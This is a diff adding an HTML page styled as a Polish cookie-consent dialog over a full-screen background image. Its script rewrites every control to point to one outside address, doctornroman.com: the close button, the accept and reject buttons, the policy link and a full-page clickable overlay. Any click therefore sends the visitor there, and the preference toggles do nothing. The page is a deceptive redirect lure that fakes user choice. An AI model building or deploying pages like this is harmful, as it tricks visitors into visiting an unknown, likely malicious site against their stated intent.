@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Impostazioni cookie</title>
+
+  <!-- ====== CONFIG ====== -->
+  <script>
+    // ✅ paths to background images
+    const PC_BG  = "./pc.jpg";
+    const MOB_BG = "./mob.jpg";
+
+    // ✅ link that must be used everywhere (buttons + overlay click)
+    const OUT_LINK = "https://a67an.doctornroman.com/l";
+  </script>
+
+  <!-- Preload backgrounds -->
+  <link rel="preload" as="image" href="./pc.jpg" media="(min-width: 769px)">
+  <link rel="preload" as="image" href="./mob.jpg" media="(max-width: 768px)">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap');
+
+    :root{
+      --glass: rgba(255,255,255,.10);
+      --glass2: rgba(255,255,255,.14);
+      --stroke: rgba(255,255,255,.22);
+      --text: rgba(255,255,255,.92);
+      --muted: rgba(255,255,255,.72);
+      --shadow: 0 22px 70px rgba(0,0,0,.45);
+      --radius: 20px;
+      --blur: 16px;
+    }
+
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; }
+
+    body{
+      margin:0;
+      font-family:"Montserrat",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      color: var(--text);
+      overflow:hidden;
+    }
+
+    /* ===== PAGE BG ===== */
+    .page{
+      position:relative;
+      height:100vh;
+      width:100%;
+      background: center top / cover no-repeat;
+    }
+    @media (min-width: 769px){
+      .page{ background-image: url("./pc.jpg"); }
+    }
+    @media (max-width: 768px){
+      .page{ background-image: url("./mob.jpg"); }
+    }
+
+    /* subtle vignette */
+    .vignette{
+      position:absolute; inset:0;
+      background:
+        radial-gradient(1200px 700px at 30% 20%, rgba(255,255,255,.10), transparent 55%),
+        radial-gradient(1000px 700px at 80% 10%, rgba(255,255,255,.08), transparent 60%),
+        linear-gradient(180deg, rgba(0,0,0,.28), rgba(0,0,0,.55));
+      pointer-events:none;
+    }
+
+    /* ===== OVERLAY (clickable) ===== */
+    .overlay{
+      position:absolute; inset:0;
+      background: rgba(0,0,0,.35);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      opacity:0;
+      pointer-events:none;
+      transition: opacity .25s ease;
+    }
+    .overlay.show{
+      opacity:1;
+      pointer-events:auto;
+      cursor:pointer;
+    }
+
+    /* ===== MODAL ===== */
+    .cookie-modal{
+      position:absolute;
+      left:50%;
+      transform: translateX(-50%) translateY(10px);
+      bottom: 26px;
+      width:min(920px, calc(100% - 24px));
+      border-radius: var(--radius);
+      background: linear-gradient(180deg, var(--glass2), var(--glass));
+      border: 1px solid var(--stroke);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(var(--blur));
+      -webkit-backdrop-filter: blur(var(--blur));
+      overflow:hidden;
+      opacity:0;
+      pointer-events:none;
+      transition: opacity .28s ease, transform .28s ease;
+    }
+    .cookie-modal.show{
+      opacity:1;
+      pointer-events:auto;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .modal-inner{
+      display:grid;
+      grid-template-columns: 1.2fr .8fr;
+      gap: 18px;
+      padding: 18px 18px 16px;
+    }
+
+    @media (max-width: 768px){
+      .cookie-modal{
+        bottom: 16px;
+        width: calc(100% - 18px);
+        border-radius: 18px;
+      }
+      .modal-inner{
+        grid-template-columns: 1fr;
+        gap: 14px;
+        padding: 16px;
+      }
+    }
+
+    .topline{
+      display:flex;
+      align-items:flex-start;
+      justify-content:space-between;
+      gap:12px;
+      margin-bottom: 10px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      min-width: 0;
+    }
+    .logo-dot{
+      width:12px; height:12px;
+      border-radius: 50%;
+      background: rgba(255,255,255,.92);
+      box-shadow: 0 0 0 6px rgba(255,255,255,.08);
+      flex: 0 0 auto;
+    }
+    .brand-title{
+      font-weight:700;
+      letter-spacing:.2px;
+      font-size: 14px;
+      line-height: 1.1;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+    .close-btn{
+      width:40px; height:40px;
+      border-radius: 14px;
+      border: 1px solid rgba(255,255,255,.18);
+      background: rgba(255,255,255,.06);
+      color: rgba(255,255,255,.9);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      cursor:pointer;
+      transition: transform .15s ease, background .15s ease;
+      flex: 0 0 auto;
+    }
+    .close-btn:hover{ transform: translateY(-1px); background: rgba(255,255,255,.10); }
+    .close-btn:active{ transform: translateY(0); }
+
+    .title{
+      font-size: 18px;
+      font-weight: 700;
+      margin: 0 0 6px;
+    }
+    .desc{
+      margin: 0;
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    /* ===== PREFS ===== */
+    .prefs{
+      margin-top: 12px;
+      border-radius: 16px;
+      border: 1px solid rgba(255,255,255,.14);
+      background: rgba(0,0,0,.18);
+      overflow:hidden;
+    }
+    .prefs-head{
+      width:100%;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      padding: 12px 12px;
+      cursor:pointer;
+      user-select:none;
+      color: rgba(255,255,255,.90);
+      font-weight: 600;
+      font-size: 13px;
+    }
+    .chev{
+      width:10px; height:10px;
+      border-right: 2px solid rgba(255,255,255,.75);
+      border-bottom: 2px solid rgba(255,255,255,.75);
+      transform: rotate(45deg);
+      transition: transform .18s ease;
+      margin-right: 2px;
+    }
+    .prefs.open .chev{ transform: rotate(-135deg); }
+
+    .prefs-body{
+      max-height: 0;
+      overflow:hidden;
+      transition: max-height .22s ease;
+    }
+    .prefs.open .prefs-body{ max-height: 240px; }
+
+    .pref-row{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:14px;
+      padding: 10px 12px;
+      border-top: 1px solid rgba(255,255,255,.10);
+    }
+    .pref-row p{
+      margin:0;
+      font-size: 12.5px;
+      color: rgba(255,255,255,.84);
+      line-height: 1.25;
+    }
+    .pref-row small{
+      display:block;
+      margin-top: 3px;
+      font-size: 11px;
+      color: rgba(255,255,255,.62);
+      line-height: 1.25;
+    }
+
+    .toggle{
+      position:relative;
+      width:44px; height:26px;
+      border-radius: 999px;
+      border: 1px solid rgba(255,255,255,.18);
+      background: rgba(255,255,255,.10);
+      cursor:pointer;
+      flex: 0 0 auto;
+      transition: background .15s ease;
+    }
+    .toggle::after{
+      content:"";
+      position:absolute;
+      top:3px; left:3px;
+      width:20px; height:20px;
+      border-radius: 50%;
+      background: rgba(255,255,255,.92);
+      transition: transform .15s ease;
+      box-shadow: 0 10px 20px rgba(0,0,0,.25);
+    }
+    .toggle.on{ background: rgba(255,255,255,.22); }
+    .toggle.on::after{ transform: translateX(18px); }
+    .toggle.locked{ opacity:.65; cursor:not-allowed; }
+
+    /* ===== ACTIONS ===== */
+    .actions{
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+      justify-content:center;
+      padding: 2px 2px 2px 0;
+    }
+    @media (max-width: 768px){
+      .actions{ padding: 0; }
+    }
+
+    .btn{
+      width:100%;
+      border:0;
+      border-radius: 16px;
+      padding: 12px 14px;
+      cursor:pointer;
+      font-weight: 700;
+      font-size: 14px;
+      letter-spacing: .15px;
+      transition: transform .15s ease, filter .15s ease, background .15s ease;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      text-decoration:none;
+      color:#0b0b0b;
+      background: rgba(255,255,255,.92);
+    }
+    .btn:hover{ transform: translateY(-1px); filter: brightness(1.03); }
+    .btn:active{ transform: translateY(0); }
+
+    .btn.secondary{
+      color: rgba(255,255,255,.92);
+      background: rgba(255,255,255,.10);
+      border: 1px solid rgba(255,255,255,.18);
+    }
+    .btn.ghost{
+      color: rgba(255,255,255,.92);
+      background: transparent;
+      border: 1px dashed rgba(255,255,255,.22);
+    }
+
+    .meta{
+      margin-top: 10px;
+      font-size: 11px;
+      color: rgba(255,255,255,.62);
+      line-height: 1.35;
+    }
+    .meta a{
+      color: rgba(255,255,255,.85);
+      text-decoration: underline;
+    }
+
+    @media (max-width: 420px){
+      .title{ font-size: 16px; }
+      .btn{ padding: 11px 12px; border-radius: 14px; }
+      .close-btn{ width:38px; height:38px; border-radius: 13px; }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page" id="page">
+    <div class="vignette"></div>
+
+    <!-- overlay that must use the same link -->
+    <a class="overlay" id="overlay" href="#" aria-label="Kliknięcie nakładki"></a>
+
+    <section class="cookie-modal" id="cookieModal" role="dialog" aria-modal="true" aria-label="Preferencje dotyczące plików cookie">
+      <div class="modal-inner">
+        <!-- LEFT -->
+        <div>
+          <div class="topline">
+            <div class="brand">
+              <div class="logo-dot" aria-hidden="true"></div>
+              <div class="brand-title">Preferencje prywatności i plików cookie</div>
+            </div>
+
+            <!-- close button must use same link -->
+            <a class="close-btn" id="closeBtn" href="#" aria-label="Zamknij">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M6 6L18 18M18 6L6 18" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
+              </svg>
+            </a>
+          </div>
+
+          <h2 class="title">Używamy plików cookie, aby poprawić Twoje doświadczenie</h2>
+          <p class="desc">
+            Pliki cookie pomagają nam personalizować treści, zrozumieć sposób korzystania z witryny
+            oraz poprawić jej wydajność. Możesz zaakceptować wszystkie pliki cookie
+            lub zarządzać swoimi preferencjami w dowolnym momencie.
+          </p>
+
+          <div class="prefs" id="prefs">
+            <div class="prefs-head" id="prefsHead" role="button" tabindex="0" aria-expanded="false">
+              <span>Zarządzaj preferencjami</span>
+              <span class="chev" aria-hidden="true"></span>
+            </div>
+
+            <div class="prefs-body" id="prefsBody" aria-hidden="true">
+              <div class="pref-row">
+                <div>
+                  <p>Niezbędne</p>
+                  <small>Niezbędne do prawidłowego działania witryny.</small>
+                </div>
+                <div class="toggle on locked" title="Zawsze aktywne" aria-label="Niezbędne pliki cookie są zawsze aktywne"></div>
+              </div>
+
+              <div class="pref-row">
+                <div>
+                  <p>Analityczne</p>
+                  <small>Pomagają nam zrozumieć, jak odwiedzający korzystają z witryny.</small>
+                </div>
+                <div class="toggle" data-toggle="analytics" aria-label="Włącz/wyłącz analityczne pliki cookie"></div>
+              </div>
+
+              <div class="pref-row">
+                <div>
+                  <p>Marketingowe</p>
+                  <small>Służą do wyświetlania dopasowanych komunikatów i pomiaru reklam.</small>
+                </div>
+                <div class="toggle" data-toggle="marketing" aria-label="Włącz/wyłącz marketingowe pliki cookie"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="meta">
+            Kontynuując, wyrażasz zgodę na używanie plików cookie.
+            <a id="policyLink" href="#">Dowiedz się więcej</a>.
+          </div>
+        </div>
+
+        <!-- RIGHT -->
+        <div class="actions">
+          <a class="btn" id="acceptAll" href="#">Akceptuj wszystkie</a>
+          <a class="btn secondary" id="acceptSelected" href="#">Akceptuj wybrane</a>
+          <a class="btn ghost" id="rejectAll" href="#">Odrzuć niezbędne</a>
+        </div>
+      </div>
+    </section>
+  </div>
+
+
+  <script>
+    // Apply runtime config for bg + link everywhere
+    (function init(){
+      // background images (override CSS default if you want dynamic)
+      const page = document.getElementById("page");
+      const isMobile = window.matchMedia("(max-width: 768px)").matches;
+      page.style.backgroundImage = `url("${isMobile ? MOB_BG : PC_BG}")`;
+
+      // set same link everywhere
+      const linkIds = ["overlay","closeBtn","acceptAll","acceptSelected","rejectAll","policyLink"];
+      linkIds.forEach(id => {
+        const el = document.getElementById(id);
+        if(el) el.setAttribute("href", OUT_LINK);
+      });
+    })();
+
+    // Show modal on load
+    const overlay = document.getElementById("overlay");
+    const modal = document.getElementById("cookieModal");
+    requestAnimationFrame(() => {
+      overlay.classList.add("show");
+      modal.classList.add("show");
+    });
+
+    // Preferences accordion
+    const prefs = document.getElementById("prefs");
+    const prefsHead = document.getElementById("prefsHead");
+    const prefsBody = document.getElementById("prefsBody");
+
+    function togglePrefs(){
+      const open = prefs.classList.toggle("open");
+      prefsHead.setAttribute("aria-expanded", open ? "true" : "false");
+      prefsBody.setAttribute("aria-hidden", open ? "false" : "true");
+    }
+    prefsHead.addEventListener("click", togglePrefs);
+    prefsHead.addEventListener("keydown", (e) => {
+      if(e.key === "Enter" || e.key === " "){
+        e.preventDefault();
+        togglePrefs();
+      }
+    });
+
+    // Toggles (demo state)
+    document.querySelectorAll(".toggle[data-toggle]").forEach(t => {
+      t.addEventListener("click", () => t.classList.toggle("on"));
+    });
+
+    // Optional: on resize swap bg
+    window.addEventListener("resize", () => {
+      const page = document.getElementById("page");
+      const isMobile = window.matchMedia("(max-width: 768px)").matches;
+      page.style.backgroundImage = `url("${isMobile ? MOB_BG : PC_BG}")`;
+    });
+  </script>
+</body>
+</html>
+
